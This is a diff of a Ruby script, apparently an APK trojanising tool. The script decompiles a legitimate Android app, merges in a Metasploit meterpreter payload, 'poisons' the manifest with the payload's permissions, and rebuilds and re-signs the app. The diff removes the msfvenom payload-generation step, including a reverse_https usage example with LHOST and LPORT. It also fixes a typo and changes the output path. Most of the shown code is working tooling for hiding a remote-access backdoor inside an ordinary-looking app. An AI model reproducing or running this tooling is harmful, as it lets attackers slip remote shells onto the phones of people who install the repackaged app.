@@ -89,8 +89,8 @@ def fix_manifest()
 	}
 	original_permissions=[]
 	apk_mani=''
-
-	#Load original apk's permissions
+        
+        #Load original apk's permissions
 	File.open("output/original/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
 		apk_mani=k
@@ -152,29 +152,6 @@ unless(apk_v.split()[1].include?("v2."))
 	exit(1)
 end
 
-begin
-	msfvenom_opts = ARGV[1,ARGV.length]
-	opts=""
-	msfvenom_opts.each{|x|
-	opts+=x
-	opts+=" "
-	}
-rescue
-	puts "Usage: #{$0} [target.apk] [msfvenom options]\n"
-	puts "e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
-	puts "[-] Error parsing msfvenom options. Exiting.\n"
-	exit(1)
-end
-
-
-
-print "[*] Generating msfvenom payload..\n"
-res=`msfvenom -f raw #{opts} -o output/payload.apk `
-if res.downcase.include?("invalid" || "error")
-	puts res
-	exit(1)
-end
-
 print "[*] Signing payload..\n"
 `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA 'output/payload.apk' androiddebugkey`
 
@@ -183,7 +160,7 @@ print "[*] Signing payload..\n"
 
 `cp #{apkfile} output/original.apk`
 
-print "[*] Decompiling orignal APK..\n"
+print "[*] Decompiling original APK..\n"
 `apktool d output/original.apk -o output/original`
 print "[*] Decompiling payload APK..\n"
 `apktool d output/payload.apk -o output/payload`
@@ -226,7 +203,7 @@ print "[*] Poisoning the manifest with meterpreter permissions..\n"
 fix_manifest()
 
 print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
-`apktool b -o output/#{injected_apk} output/original`
+`apktool b -o #{injected_apk} output/original`
 print "[*] Signing #{injected_apk} ..\n"
 `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey`
 
